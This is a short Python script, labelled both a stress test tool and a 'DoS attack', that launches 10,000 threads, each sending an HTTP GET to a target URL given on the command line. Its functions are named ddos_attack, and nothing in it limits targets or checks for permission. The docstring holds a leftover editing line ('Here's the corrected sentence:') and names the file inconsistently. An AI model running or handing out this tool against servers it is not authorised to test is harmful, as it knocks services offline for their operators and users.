"""
Basic HTTP Stress Test Tool (Dos attack)
----------------------------
This script performs a basic stress test on a given server by sending multiple 
concurrent HTTP GET requests using threading.
Here’s the corrected sentence:
Since all requests originate from a single IP address, this falls under the category of a DoS (Denial-of-Service) attack,
rather than a DDoS (Distributed Denial-of-Service) attack.

Features:
- Sends a large number of HTTP GET requests to a specified target.
- Uses multiple threads to generate concurrent requests.
- Handles request failures and timeouts gracefully.
- Can be used to test the response behavior of a web server.

How to Use:
0. The target should be specified as a full URL, including protocol and port if needed:
   
   Example: python3 ./dos_attack.py {server_ip}
"""

import sys
import threading
import requests

def ddos_attack(server):
    try:
        response = requests.get(server)
        print(f"Response status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to connect to {server}. Error: {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 ddos_attack.py <http://server:port>")
        sys.exit(1)

    target_url = sys.argv[1]

    num_threads = 10000

    threads = []
    
    for _ in range(num_threads):
        thread = threading.Thread(target=ddos_attack, args=(target_url,))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
